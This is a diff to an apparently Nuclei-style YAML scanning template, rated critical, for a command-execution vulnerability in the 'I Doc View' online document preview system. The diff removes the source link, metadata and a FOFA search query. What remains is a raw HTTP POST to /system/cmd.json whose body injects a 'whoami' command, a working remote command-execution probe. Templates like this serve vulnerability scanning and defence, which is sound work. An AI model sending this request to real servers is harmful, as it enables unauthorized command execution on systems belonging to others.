@@ -3,12 +3,8 @@ info:
   name: I Doc View在线文档预览系统命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zlzet21osw87xb6f'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: zlzet21osw87xb6f
-    fofa: title=="在线文档预览 - I Doc View"
 http:
 - raw:
   - 'POST /system/cmd.json HTTP/1.1
@@ -18,8 +14,6 @@ http:
 
 
     Connection: close
-
-
 
 
     cmd=echo+%26+%28whoami%29+%26
